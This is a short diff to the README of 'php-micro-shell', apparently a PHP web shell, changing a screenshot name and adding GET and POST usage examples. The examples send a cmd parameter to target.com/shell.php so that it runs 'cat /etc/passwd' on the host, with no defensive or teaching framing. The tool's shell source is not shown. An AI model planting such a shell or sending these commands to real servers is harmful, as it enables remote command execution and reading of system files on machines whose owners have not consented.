@@ -1,11 +1,11 @@
 # php-micro-shell
 Simple PHP micro shell
 
-![Screenshot](screenshot.jpg)
+![Screenshot](screenshot.png)
 
 ## Usage
-http://target.com/shell.php?cmd=cat+/etc/passwd
-
+GET: http://target.com/shell.php?cmd=cat+/etc/passwd
+POST: http://target.com/shell.php ; data=cmd=cat+/etc/passwd
 ## License
 
 ```
